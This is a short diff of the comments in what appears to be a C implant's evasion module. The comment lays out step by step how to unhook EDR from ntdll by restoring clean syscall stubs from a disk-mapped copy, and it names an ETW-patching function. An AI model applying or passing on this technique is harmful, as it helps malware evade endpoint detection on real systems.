@@ -136,25 +136,24 @@ BOOL evasion_patch_etw(void) {
  * SEC_IMAGE mapping over the loaded ntdll.  This reverts Windows in-memory
  * hotfixes (KB patches applied to ntdll at load time) and corrupts internal
  * helper functions that WinHTTP and other high-level networking APIs depend
- * on — causing WinHttpSendRequest to hang indefinitely.
+ * on, causing WinHttpSendRequest to hang indefinitely.
  *
- * The new approach walks the clean ntdll's export table and only restores
- * individual Nt*/Zw* syscall stubs that an EDR has actually hooked:
+ * The new approach walks the clean ntdll export table and only restores
+ * individual Nt and Zw syscall stubs that an EDR has actually hooked:
  *
  *  1. Map a clean copy of ntdll from disk (SEC_IMAGE)
- *  2. Walk the clean ntdll's export directory
+ *  2. Walk the clean ntdll export directory
  *  3. For each export that is a syscall stub (clean copy starts with
- *     4C 8B D1 = "mov r10, rcx"):
+ *     0x4C 0x8B 0xD1 = mov r10, rcx):
  *       - Compare the first STUB_PATCH_SIZE bytes in the loaded copy
  *       - If they differ (hooked by EDR), overwrite with the clean bytes
  *  4. Leave everything else in .text untouched
  *
  * This removes EDR inline hooks while preserving Windows hotfixes,
- * so WinHTTP / WinINet / networking continues to work.
+ * so WinHTTP and WinINet networking continues to work.
  *
  * No relocation fixups are needed because x64 syscall stubs use only
- * RIP-relative addressing in their first ~24 bytes (the stub body is
- * mov r10,rcx / mov eax,SSN / test / jne / syscall / ret / int 2E / ret).
+ * RIP-relative addressing in their first ~24 bytes.
  */
 
 #define STUB_PATCH_SIZE 32   /* bytes to restore per hooked stub */
